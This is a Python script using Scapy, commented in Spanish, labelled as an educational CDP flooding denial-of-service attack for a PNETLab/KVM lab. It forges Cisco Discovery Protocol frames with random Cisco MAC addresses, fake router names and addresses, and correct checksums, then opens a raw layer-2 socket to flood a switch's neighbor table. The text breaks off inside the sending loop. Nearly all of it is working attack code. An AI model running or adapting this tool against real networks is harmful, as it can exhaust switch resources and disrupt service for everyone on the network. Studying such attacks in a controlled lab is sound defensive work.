#!/usr/bin/env python3
"""
=============================================================
  ATAQUE DoS — CDP Flooding (Versión Universal)
  Protocolo: Cisco Discovery Protocol (CDP)
  Herramienta: Scapy
  Entorno: PNETLab / KVM (Educativo y Controlado)
=============================================================
"""

import random
import time
import sys
import signal
import struct
import socket
from scapy.all import Ether, SNAP, LLC, conf, Raw

# ──────────────────────────────────────────────
#  CONFIGURACIÓN ADAPTADA A TU ENTORNO
# ──────────────────────────────────────────────
INTERFACE   = "ens4"          # Tu interfaz física principal en KVM
PAQUETES    = 1500            # Cantidad de vecinos falsos a inyectar
INTERVALO   = 0.005           # Envío veloz para saturar la tabla eficientemente


def calcular_checksum(data: bytes) -> int:
    """Calcula el checksum estándar de complemento a uno para tramas de red."""
    if len(data) % 2 == 1:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff


def mac_aleatoria() -> str:
    """Genera una dirección MAC aleatoria con el OUI de Cisco."""
    return "00:00:0c:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def device_id_aleatorio() -> str:
    """Genera un Hostname de Router falso para la tabla de vecinos."""
    return "ROUTER-" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=6))


def ip_aleatoria() -> str:
    """Genera una dirección IP ficticia de origen."""
    return "10.%d.%d.%d" % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))


def construir_payload_cdp(dev_id: str, ip_addr: str) -> bytes:
    """Construye manualmente los TLVs binarios de CDP con un Checksum válido."""
    def tlv(tipo: int, valor: bytes) -> bytes:
        longitud = 4 + len(valor)
        return struct.pack("!HH", tipo, longitud) + valor

    # TLV 0x0001 — Device-ID
    t_device = tlv(0x0001, dev_id.encode())

    # TLV 0x0002 — Addresses (IPv4)
    ip_bytes = socket.inet_aton(ip_addr)
    t_addresses = tlv(0x0002, struct.pack("!I", 1) +  # Número de direcciones (1)
                            struct.pack("!B", 1) +  # Protocolo tipo: NLPID
                            struct.pack("!B", 1) +  # Longitud protocolo (1)
                            struct.pack("!B", 0xCC) + # Protocolo: IP (0xCC)
                            struct.pack("!H", 4) +   # Longitud dirección (4)
                            ip_bytes)

    # TLV 0x0003 — Port-ID
    t_port = tlv(0x0003, b"GigabitEthernet0/0")

    # TLV 0x0004 — Capabilities (Router + Switch)
    t_cap = tlv(0x0004, struct.pack("!I", 0x29))

    # TLV 0x0005 — Software Version
    t_ver = tlv(0x0005, b"Cisco IOS 15.1")

    # TLV 0x0006 — Platform
    t_plat = tlv(0x0006, b"Cisco 3750")

    payload = t_device + t_addresses + t_port + t_cap + t_ver + t_plat

    # Cabecera base CDP: Versión (2), TTL (180), Checksum provisional (0)
    cdp_header_prov = struct.pack("!BBH", 2, 180, 0)

    # Calcular el Checksum real sobre toda la estructura CDP
    chk = calcular_checksum(cdp_header_prov + payload)

    # Reconstruir cabecera con el Checksum real corregido
    cdp_header_real = struct.pack("!BBH", 2, 180, chk)

    return cdp_header_real + payload


def main():
    print("=" * 60)
    print("   ATAQUE DoS — CDP Flooding (Versión Universal)")
    print("=" * 60)
    print(f"  Interfaz : {INTERFACE}")
    print(f"  Paquetes : {PAQUETES}")
    print(f"  Intervalo: {INTERVALO}s\n")

    enviados = 0

    def salir(sig, frame):
        print(f"\n\n  [!] Ataque interrumpido por el usuario. Total enviados: {enviados}")
        sys.exit(0)

    signal.signal(signal.SIGINT, salir)

    print("  [+] Abriendo socket L2 e iniciando inundación de vecinos...\n")

    try:
        sock = conf.L2socket(iface=INTERFACE)
        mac_destino_cdp = "01:00:0c:cc:cc:cc"

        for i in range(1, PAQUETES + 1):
            src_mac = mac_aleatoria()
            dev_id  = device_id_aleatorio()
            ip_fake = ip_aleatoria()

            # 1. Generar la parte de datos binarios puros de CDP
            cdp_data = construir_payload_cdp(dev_id, ip_fake)
